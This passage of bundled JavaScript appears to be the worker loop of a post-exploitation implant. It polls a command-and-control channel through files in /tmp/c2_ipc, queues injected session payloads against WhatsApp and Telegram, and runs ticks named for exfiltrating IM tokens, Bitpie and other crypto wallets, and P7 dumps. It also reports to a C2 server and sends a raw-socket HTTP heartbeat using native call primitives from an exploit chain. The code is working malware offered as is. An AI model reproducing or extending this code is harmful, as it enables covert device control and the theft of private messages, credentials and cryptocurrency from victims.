												tpl = String(_raw_loader_session_whatsapp_js__WEBPACK_IMPORTED_MODULE_23__["default"] || "");
											} else if (payloadName === "telegram" || payloadName === "tg" || payloadName === "tglib") {
												try {
													tpl = String((_raw_loader_session_telegram_js__WEBPACK_IMPORTED_MODULE_24__ || {})["default"] || "");
												} catch (_) { tpl = ""; }
											} else {
												tpl = String(_raw_loader_session_probe_js__WEBPACK_IMPORTED_MODULE_22__["default"] || "");
											}
										}
										if (!tpl || tpl.length < 80 || tpl.indexOf("omitted (PE slim") >= 0) {
											outObj = {
												ok: false,
												error: "need_pe_load",
												hint: "pe_load " + mid + ".js then pe_session_start",
												path: mpath,
												session_id: sid,
												id: rid
											};
											LOG("[PE-LISTEN] session_start need_pe_load " + mid);
										} else {
										let code = tpl.split("__SESSION_ID__").join(sid).split("__SESSION_TARGET__").join(target);
										// Default old_pe async (bg evaluateScript). Opt-in sync via sync_eval=true.
										let wantSync = !!(cmdObj && (cmdObj.sync_eval || cmdObj.syncEval));
										if (payloadName === "telegram" || payloadName === "tg" || payloadName === "tglib" ||
											payloadName === "whatsapp" || payloadName === "wa") {
											code = "var __PE_SESSION_ONESHOT=true;\n" + code;
										}
										// Queue inject - never block listen / pe.result (large configd InjectJS was hanging ~40s+)
										if (!globalThis.__pe_sess_inj_q) globalThis.__pe_sess_inj_q = [];
										globalThis.__pe_sess_inj_q.push({
											sid: sid,
											target: target,
											payload: payloadName,
											code: code,
											full_code: code,
											sync_eval: wantSync,
											queued_ts: ts,
											phase: wantSync ? "cmd_sync_oneshot" : "cmd_async"
										});
										globalThis.__pe_sessions[sid] = {
											id: sid,
											target: target,
											payload: payloadName,
											pid: 0,
											state: "queued",
											started: ts,
											full_code: code
										};
										peWriteInventory();
										peWriteSessionStatus(sid, {
											state: "queued",
											ok: true,
											pending: true,
											target: target,
											payload: payloadName,
											code_len: code.length
										});
										LOG("[PE-LISTEN] session_start queued id=" + sid + " target=" + target + " len=" + code.length + " q=" + globalThis.__pe_sess_inj_q.length);
										outObj = {
											ok: true,
											session_id: sid,
											target: target,
											pid: 0,
											state: "queued",
											pending: true,
											queued: true,
											id: rid,
											role: "pe_worker"
										};
										}
									}
								} else if (ctype === "session_stop") {
									let sid2 = (cmdObj && (cmdObj.session_id || cmdObj.sid)) ? String(cmdObj.session_id || cmdObj.sid) : "";
									if (!sid2) {
										outObj = { ok: false, error: "session_id required", id: rid };
									} else {
										try {
											let stopBody = "{\"stop\":true,\"ts\":" + ts + "}\n";
											let sfd = fopen(get_cstring("/tmp/c2_ipc/session." + sid2 + ".stop"), get_cstring("w"));
											if (sfd && sfd !== 0n) {
												let sbuf = get_cstring(stopBody);
												fwrite(sbuf, 1n, BigInt(stopBody.length), sfd);
												fclose(sfd);
											}
										} catch (_) {}
										if (globalThis.__pe_sessions && globalThis.__pe_sessions[sid2]) {
											globalThis.__pe_sessions[sid2].state = "stopped";
											globalThis.__pe_sessions[sid2].stopped = ts;
										}
										peWriteInventory();
										LOG("[PE-LISTEN] session_stop id=" + sid2);
										outObj = { ok: true, session_id: sid2, state: "stopped", id: rid, role: "pe_worker" };
									}
								} else if (ctype === "session_list") {
									let list = [];
									let sess = globalThis.__pe_sessions || {};
									let keys = Object.keys(sess);
									for (let i = 0; i < keys.length; i++) list.push(sess[keys[i]]);
									peWriteInventory();
									outObj = { ok: true, sessions: list, pe_pid: Number(pePid), id: rid, role: "pe_worker" };
								}
							} catch (cmdErr) {
								outObj = { ok: false, error: String(cmdErr).slice(0, 120), id: rid };
							}
							let outStr = JSON.stringify(outObj) + "\n";
							let rpath = "/tmp/c2_ipc/pe.result." + rid;
							let rfd = fopen(get_cstring(rpath), get_cstring("w"));
							if (rfd && rfd !== 0n) {
								let obuf = get_cstring(outStr);
								fwrite(obuf, 1n, BigInt(outStr.length), rfd);
								fclose(rfd);
								LOG("[PE-LISTEN] result wrote " + rpath + " type=" + ctype);
							} else {
								LOG("[PE-LISTEN] result open FAIL " + rpath);
							}
						}
					}
				} catch (cmdTickErr) {
					LOG("[PE-LISTEN] cmd poll ERR: " + cmdTickErr);
				}

				// Drain one queued session inject per tick (after pe.result ack)
				if (peTick === 1) try { peSessionEvalEnsure(); } catch (_) {}
				try { peDrainSessionInj(); } catch (_) {}
				try { pePollSessionEvals(); } catch (_) {}
				try { peSessionEvalStaleTick(); } catch (_) {}
				try { peAdminTaskTick(); } catch (_) {}
				// Pipeline state + deferred P7 after eval poll (P7 RC still blocks one tick).
				try {
					if (PE_DIRECT_PIPELINE) peDirectPipelineTick();
					if (PE_DIRECT_PIPELINE) peDirectTgDeferredTick();
					if (PE_DIRECT_PIPELINE) peDirectP7DeferredTick();
					if (PE_DIRECT_PIPELINE) peDirectWaDeferredTick();
					if (PE_DIRECT_PIPELINE) peDirectImDeferredTick();
					if (PE_DIRECT_PIPELINE) peDirectBpDeferredTick();
					if (PE_DIRECT_PIPELINE) peDirectWalletDeferredTick();
					if (PE_DIRECT_PIPELINE) peDirectWarDeferredTick();
					peP7DumpExfilTick();
					peImTokenExfilTick();
					peBitpieExfilTick();
					peWalletScanExfilTick();
					peWarExfilTick();
				} catch (_) {}

				if (peTick === 1 || (peTick % peHbEvery) === 0) {
					let body = "{\"pid\":" + pePid + ",\"path\":" + JSON.stringify(String(peHost)) + ",\"tick\":" + peTick + ",\"ts\":" + ts + ",\"role\":\"pe_worker\"}\n";
					let fd = fopen(get_cstring("/tmp/c2_ipc/pe.heartbeat"), get_cstring("w"));
					if (fd && fd !== 0n) {
						let buf = get_cstring(body);
						fwrite(buf, 1n, BigInt(body.length), fd);
						fclose(fd);
					} else {
						LOG("[PE-LISTEN] heartbeat open FAIL tick=" + peTick);
					}
					LOG("[PE-LISTEN] heartbeat tick=" + peTick + " pid=" + pePid);
					peReportToC2();
				}
			} catch (tickErr) {
				try { LOG("[PE-LISTEN] tick ERR: " + tickErr); } catch (_) {}
			}
			// Lab: pe_dbg_tcp hot module poll (non-blocking); never break listen
			try {
				if (globalThis.__pe_dbg_tcp && typeof globalThis.__pe_dbg_tcp.poll === "function") {
					globalThis.__pe_dbg_tcp.poll();
				}
			} catch (dbgTickErr) {
				try { LOG("[PE-LISTEN] dbg_tcp poll ERR: " + String(dbgTickErr).slice(0, 80)); } catch (_) {}
			}
			try {
				N.callSymbol("sleep", 2);
			} catch (_) {
				try { sleep(2n); } catch (__) {}
			}
		}
	} else try {
		let _C = func_resolve("connect");
		let _fd = socket(2n, 1n, 0n);
		if (_fd > 0n) {
			let _sa = calloc(1n, 16n);
			uwrite64(_sa, 0xDEAD00000000BEEFn);
			uwrite64(_sa + 8n, 0n);
			let _r = fcall(_C, _fd, _sa, 16n);
			if (_r == 0n) {
				let _b = "heartbeat:pe_done";
				let _h = "POST /heartbeat HTTP/1.0\r\nContent-Length: " + _b.length + "\r\n\r\n" + _b;
				let _buf = get_cstring(_h);
				fcall(WRITE, _fd, _buf, BigInt(_h.length));
				LOG("[HB] heartbeat sent");
			} else { LOG("[HB] connect fail: " + _r); }
			close(_fd);
			free(_sa);
		} else { LOG("[HB] socket fail"); }
	} catch(_e) { LOG("[HB] err: " + _e); }
	if (!globalThis.PE_SKIP_WORKER_EXIT) {
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("exit", 0n);
	}
}

})();

/******/ })()
;
  } catch (error) {
	  LOG(`Main function resulted with an error: ${error}`);
	  LOG("stack: " + error.stack);
  }
})();
